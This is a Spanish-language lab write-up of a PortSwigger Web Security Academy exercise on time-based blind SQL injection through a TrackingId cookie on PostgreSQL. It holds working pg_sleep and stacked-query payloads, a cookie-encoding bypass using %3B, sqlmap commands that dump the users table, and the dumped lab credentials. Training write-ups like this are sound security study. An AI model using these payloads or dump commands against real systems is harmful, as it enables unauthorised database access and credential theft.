# PortSwigger: Blind SQL Injection with Time Delays

**Dificultad:** Apprentice
**Plataforma:** PortSwigger Web Security Academy
**Motor de base de datos:** PostgreSQL
**Herramientas usadas:** Burp Suite (Repeater), sqlmap

## Resumen

Explotación de una inyección SQL ciega basada en **tiempo (time-based blind)** a través de la cookie `TrackingId`. A diferencia del lab de "conditional responses", aquí la aplicación no da ninguna señal visible (ni mensajes, ni cambios de tamaño): la única forma de confirmar si una condición es verdadera o falsa es midiendo cuánto tarda la respuesta del servidor. Se identificó que el motor permitía **stacked queries** (múltiples sentencias separadas por `;`), y se resolvió el lab tras detectar y corregir un problema de **URL-encoding** del carácter `;` dentro de una cookie.

## 1. Confirmando el oráculo de tiempo

Usando el valor real de la cookie `TrackingId` como base, se probó la función de delay de PostgreSQL (`pg_sleep`) dentro de una subconsulta condicional:

```
TrackingId=<ID_REAL>' AND 1=(SELECT 1 FROM pg_sleep(5))--
```

La respuesta tardó ~5200 ms, confirmando que la inyección se ejecuta y que el motor es PostgreSQL.

## 2. Confirmando condiciones específicas

Usando `CASE WHEN` dentro del propio `pg_sleep`, se pudo condicionar el delay a una comparación cualquiera:

```
TrackingId=<ID_REAL>' AND 1=(SELECT 1 FROM pg_sleep(CASE WHEN (SELECT username FROM users LIMIT 1)='administrator' THEN 5 ELSE 0 END))--
```

Esto confirmó (con ~5200 ms de respuesta) que la primera fila de la tabla `users` corresponde al usuario `administrator`, sin necesitar ver ningún dato reflejado en pantalla — solo el tiempo de espera.

## 3. Automatización con sqlmap

Se exportó una petición limpia (`request2.txt`, con el `TrackingId` original) y se dejó que sqlmap detectara el tipo de inyección:

```bash
sqlmap -r request2.txt -p TrackingId --level=2 --batch
```

sqlmap identificó una técnica distinta y más directa a la usada manualmente — **stacked queries**, es decir, ejecutar una sentencia SQL adicional separada por `;`:

```
Type: stacked queries
Title: PostgreSQL > 8.1 stacked queries (comment)
Payload: TrackingId=<ID>';SELECT PG_SLEEP(5)--
```

Para extraer la tabla `users` completa:

```bash
sqlmap -r request2.txt -p TrackingId --level=2 --batch -D public -T users --dump
```

**Resultado** (proceso que tomó cerca de 20 minutos, por la naturaleza lenta del time-based):

| username | password |
|---|---|
| administrator | `qg6gad8s9nc8m7dca1u8` |
| wiener | `kdzgaf5oh5hwca3u7uqd` |
| carlos | `pi8pndco1bwsk04zt6gp` |

## 4. Resolviendo el lab manualmente: el problema del `;` en la cookie

Este lab en particular exige provocar un delay de **exactamente 10 segundos** desde Burp para marcarse como resuelto. Al probar el mismo payload de stacked queries detectado por sqlmap directamente en Burp Repeater:

```
TrackingId=<ID>';SELECT PG_SLEEP(10)--
```

La respuesta volvía en ~170 ms, como si el payload no se ejecutara, a pesar de que la sintaxis era correcta.

**Causa:** el carácter `;` tiene un significado especial dentro de un header `Cookie:` — es el **separador oficial entre pares cookie=valor** (`TrackingId=x; session=y`). Al escribirlo tal cual dentro del valor de `TrackingId`, el servidor interpretaba que ahí terminaba esa cookie, cortando el payload antes de llegar a la base de datos.

**Solución:** codificar ese `;` como `%3B` para que viaje como parte del valor de la cookie en vez de ser tratado como separador:

```
TrackingId=<ID>'%3BSELECT PG_SLEEP(10)--
```

Con este ajuste, la respuesta tardó los 10 segundos esperados y el lab se marcó como **Solved**.

> Dato interesante: `sqlmap` ya había mostrado una pista de este comportamiento al preguntar explícitamente *"do you want to URL encode cookie values?"* al inicio del escaneo — una buena razón para prestar atención a esas preguntas interactivas en vez de aceptarlas por inercia.

## Lecciones aprendidas

- En inyecciones basadas en tiempo, el tiempo de respuesta ES el dato: no hace falta ver ningún contenido para confirmar condiciones verdaderas o falsas.
- Cuando el punto de inyección es una **cookie**, hay que tener cuidado con caracteres que tienen un significado reservado en ese contexto (como `;` o `=`), y codificarlos (URL-encode) para que lleguen intactos al servidor.
- Herramientas como sqlmap no solo automatizan la extracción, también sirven como referencia para encontrar la sintaxis exacta que funciona en un motor de base de datos específico, comparando su payload exitoso contra los intentos manuales propios.
